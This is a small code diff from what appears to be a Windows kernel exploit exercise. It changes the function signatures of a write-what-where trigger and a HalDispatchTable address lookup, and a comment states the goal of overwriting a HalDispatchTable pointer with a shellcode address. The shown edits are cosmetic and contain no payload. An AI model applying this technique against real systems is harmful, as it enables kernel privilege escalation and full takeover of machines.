@@ -41,7 +41,7 @@ typedef NTSTATUS(WINAPI* pNtQueryIntervalProfile)(
 
 PVOID getHalDispatchTableAddr();
 
-DWORD Solutions::TriggerWriteWhatWhere() {
+NTSTATUS Solutions::TriggerWriteWhatWhere() {
 	// overwrite the second pointer in the HalDispatchTable with shellcode address 
 
 	DWORD dwBufSize = 8;
@@ -85,7 +85,7 @@ DWORD Solutions::TriggerWriteWhatWhere() {
 	return 0;
 }
 
-PVOID getHalDispatchTableAddr() {
+static PVOID getHalDispatchTableAddr() {
 	ULONG modulesLength = 0;
 	PSYSTEM_MODULE_INFORMATION pModuleInfo = NULL;
 
